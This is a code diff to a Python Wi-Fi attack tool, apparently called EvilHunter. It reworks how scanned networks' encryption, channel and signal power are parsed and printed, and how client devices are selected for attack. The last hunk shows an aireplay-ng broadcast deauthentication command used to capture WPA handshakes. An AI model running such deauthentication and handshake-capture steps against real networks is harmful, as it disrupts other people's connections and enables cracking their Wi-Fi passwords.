@@ -430,31 +430,35 @@ def network_process_data(macs, net_clients, args, all_got):
 
         info = "  ".join(obetives)
         n_d = 0
-
         if re.findall("-[0-9]+", info):
-            encription = re.findall("WPA[0-9]+[ ]+[A-Z]+[ ]+[A-Z]+", info)
-            if not encription:
-                encription = re.findall("WPA+[ ]+[A-Z]+[ ]+[A-Z]+", info)
-                if not encription:
-                    continue
-
             try:
-                channel = info.split()[info.split().index("WPA2") - 2]
-            except ValueError:
-                channel = info.split()[info.split().index("WPA3") - 2]
-            except ValueError:
-                channel = info.split()[info.split().index("WPA") - 2]
-            except ValueError:
+                encription = re.findall("WPA[0-9]+", info)[0]
+            except IndexError:
                 continue
 
-            name = info.split()[info.split().index("WPA2") + 3]
+            enc2 = info.split()[info.split().index(encription) + 1]
+            enc3 = info.split()[info.split().index(encription) + 2]
+            encryption = encription + " " + enc2 + " " + enc3
+
+            if not encription:
+                encryption = re.findall("WPA", info)
+                if not encryption:
+                    continue
+
+            # Definimos información de la red
+            power = re.search("-[0-9]+", info)
+            power = power.group()
+            channel = info.split()[info.split().index(encription) - 2]
+            name = info.split()[info.split().index(encription) + 3]
+
             if re.findall("^(<length:*)", name):
                 name = f"N/D_{n_d}"
                 n_d += 1
 
             net_specs[name] = {"bssid": mac,
-                               "encription_type": encription[0],
-                               "channel": channel}
+                               "encription_type": encryption,
+                               "channel": channel,
+                               "power": power}
 
         else:
             continue
@@ -486,13 +490,15 @@ def print_process_data(net_specs, net_clients, args, all_got):
         bssid = net_specs[network]['bssid']
         channel = net_specs[network]['channel']
         cipher_type = net_specs[network]["encription_type"]
+        power = net_specs[network]["power"]
 
         time.sleep(0.5)
 
         print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) + "\n\t\t" +
               Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(bssid) + "\t\t"
               + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(channel) +
-              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(cipher_type))
+              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(cipher_type) +
+              "\t\t" + Fore.YELLOW + "[*] " + Fore.BLUE + "Power -> " + Fore.GREEN + "{}\n".format(power))
 
         # CLIENTES INFO:
         for net_num in net_clients['networks']:
@@ -518,7 +524,7 @@ def print_process_data(net_specs, net_clients, args, all_got):
             print(text)
             print("\t\t\t\t" + "-" * len(text))
 
-        print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 115, "\n\n")
+        print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 135, "\n\n")
     select_network(net_specs, net_clients, args)
 
 
@@ -534,6 +540,7 @@ def select_network(net_specs, net_clients, args):
             print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
             time.sleep(0.5)
             print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
+
     prepare_attack(net_specs, net_clients, network_to_attack, args)
 
 
@@ -556,8 +563,16 @@ def prepare_attack(net_specs, net_clients, network_to_attack, args):
     # Leer handshake
     direc = "/home/EvilHunter_Data/captures/" + network_to_attack
 
-    if net_clients:
+    for num_net in net_clients['networks']:
+        try:
+            clients = net_clients['networks'][num_net][bssid]
+        except KeyError:
+            clients = None
+            continue
+
+    if clients:
         attack_client = print_clients(net_clients, bssid)
+
     else:
         attack_client = None
 
@@ -579,6 +594,7 @@ def prepare_attack(net_specs, net_clients, network_to_attack, args):
 
 
 def print_clients(net_clients, bssid):
+
     print(Fore.YELLOW + "\n\n[*] " + Fore.LIGHTBLUE_EX + "Listing clients of the network\n" + Fore.RESET)
     print("\tPara atacar a más de 1 cliente, ¡Números seguidos por coma!:\n\n\t\t\t" + Fore.RED + " [E.j: 1,2]\n")
 
@@ -667,6 +683,7 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
         # Esperar a que todos los hilos terminen
         for thread in threads:
             thread.join()
+            
     # Si no al broadcast
     else:
         subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
